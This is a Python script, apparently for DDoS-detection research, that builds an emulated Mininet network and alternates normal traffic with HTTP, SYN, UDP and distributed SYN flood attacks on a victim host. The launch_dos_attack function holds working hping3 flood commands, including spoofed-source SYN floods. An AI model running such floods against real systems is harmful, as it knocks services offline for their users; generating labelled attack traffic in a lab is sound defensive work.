#!/home/$(whoami)/NADA/.venv/bin/python

from mininet.net import Mininet
from mininet.node import Controller, OVSKernelSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel
import random
import time
import threading
import os

def create_network_topology():
    """
    Create a network topology with multiple hosts and switches
    """
    net = Mininet(controller=Controller, switch=OVSKernelSwitch)
    
    c0 = net.addController('c0')
    
    s1 = net.addSwitch('s1')
    s2 = net.addSwitch('s2')
    
    victim1 = net.addHost('victim1', ip='10.0.0.10')
    victim2 = net.addHost('victim2', ip='10.0.0.20')
    
    normal1 = net.addHost('normal1', ip='10.0.0.50')
    normal2 = net.addHost('normal2', ip='10.0.0.51')
    
    attacker1 = net.addHost('attacker1', ip='10.0.0.100')
    attacker2 = net.addHost('attacker2', ip='10.0.0.101')
    
    net.addLink(victim1, s1)
    net.addLink(victim2, s1)
    net.addLink(normal1, s1)
    net.addLink(normal2, s1)
    net.addLink(attacker1, s2)
    net.addLink(attacker2, s2)
    net.addLink(s1, s2)
    
    net.start()
    
    return net

def generate_normal_traffic(net, duration=300):
    """
    Generate normal background traffic
    """
    print("Starting normal traffic generation...")
    victim1, victim2, normal1, normal2 = net.get('victim1', 'victim2', 'normal1', 'normal2')
    
    # Start HTTP servers on victims
    victim1.cmd('python -m http.server 80 &')
    victim2.cmd('python -m http.server 80 &')
    
    # Start iperf servers on victims
    victim1.cmd('iperf -s -p 5001 &')
    victim2.cmd('iperf -s -p 5002 &')
    
    end_time = time.time() + duration
    
    def normal_traffic_loop():
        while time.time() < end_time:
            # Simulate normal traffic (e.g., HTTP, ping, DNS)
            normal1.cmd(f'wget -q -O /dev/null http://{victim1.IP()}/index.html &')
            normal2.cmd(f'wget -q -O /dev/null http://{victim2.IP()}/index.html &')
            normal1.cmd(f'iperf -c {victim1.IP()} -p 5001 -t 5 -n 1M &')
            normal2.cmd(f'ping -c 3 {victim2.IP()} &')
            normal1.cmd(f'host -t A example.com &')
            
            # Sleep for a random interval
            time.sleep(random.uniform(1, 3))
    
    # Start the traffic generation loop in a separate thread
    normal_thread = threading.Thread(target=normal_traffic_loop)
    normal_thread.daemon = True
    normal_thread.start()
    
    return normal_thread

def launch_dos_attack(net, attack_duration=60, attack_type="http_flood", intensity=300):
    """
    Launch different types of DoS attacks
    """
    print(f"Starting {attack_type} DoS attack with intensity {intensity}...")
    victim1, attacker1, attacker2 = net.get('victim1', 'attacker1', 'attacker2')
    
    if attack_type == "http_flood":
        # HTTP flood attack with adjustable intensity
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            for _ in range(intensity):
                attacker1.cmd(f'wget -q -O /dev/null http://{victim1.IP()}/index.html &')
                attacker2.cmd(f'wget -q -O /dev/null http://{victim1.IP()}/index.html &')
            time.sleep(1)  # Spread requests over time
        attacker1.cmd('killall wget')
        attacker2.cmd('killall wget')
    
    elif attack_type == "syn_flood":
        # SYN flood attack (reduced intensity)
        attacker1.cmd(f'hping3 -S -p 80 --flood --rand-source {victim1.IP()} -i u100 &')
        pid = attacker1.cmd('echo $!')
        time.sleep(attack_duration)
        attacker1.cmd(f'kill -9 {pid.strip()}')
    
    elif attack_type == "udp_flood":
        # UDP flood attack (reduced intensity)
        attacker1.cmd(f'hping3 --udp -p 53 --flood {victim1.IP()} &')
        pid = attacker1.cmd('echo $!')
        time.sleep(attack_duration)
        attacker1.cmd(f'kill -9 {pid.strip()}')
    
    elif attack_type == "distributed_syn_flood":
        # Distributed SYN flood attack (reduced intensity)
        attacker1.cmd(f'hping3 -S -p 80 --flood {victim1.IP()} -i u100 &')
        attacker2.cmd(f'hping3 -S -p 443 --flood {victim1.IP()} -i u100 &')
        pid1 = attacker1.cmd('echo $!')
        pid2 = attacker2.cmd('echo $!')
        time.sleep(attack_duration)
        attacker1.cmd(f'kill -9 {pid1.strip()}')
        attacker2.cmd(f'kill -9 {pid2.strip()}')
    
    print(f"Finished {attack_type} DoS attack")

def simulation_scenario(net):
    """
    Run a complete simulation scenario with periods of normal traffic and DDoS attacks
    """
    normal_thread = generate_normal_traffic(net, duration=600)
    
    print("Collecting normal traffic baseline...")
    time.sleep(30)
    
    # HTTP flood attacks with intensity 300
    http_flood_attacks = [
        ("http_flood", 60, 300),  # High intensity
        ("http_flood", 60, 300),  # High intensity
        ("http_flood", 60, 300),  # High intensity
    ]
    
    print("\n=== Starting DDoS Attack Phase ===")
    
    # Run HTTP flood attacks
    for attack_type, duration, intensity in http_flood_attacks:
        launch_dos_attack(net, attack_duration=duration, attack_type=attack_type, intensity=intensity)
        print("Returning to normal traffic...")
        time.sleep(20)
    
    normal_thread.join()

def main():
    setLogLevel('info')
    
    net = create_network_topology()
    
    try:
        print("Installing required tools on hosts...")
        for host in net.hosts:
            host.cmd('apt-get update -qq > /dev/null')
            host.cmd('apt-get install -y nmap hping3 iperf wget host -qq > /dev/null')
        
        simulation_scenario(net)
        
        CLI(net)
    finally:
        net.stop()

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("You need to run this script as root!")
        exit(1)
    
    main()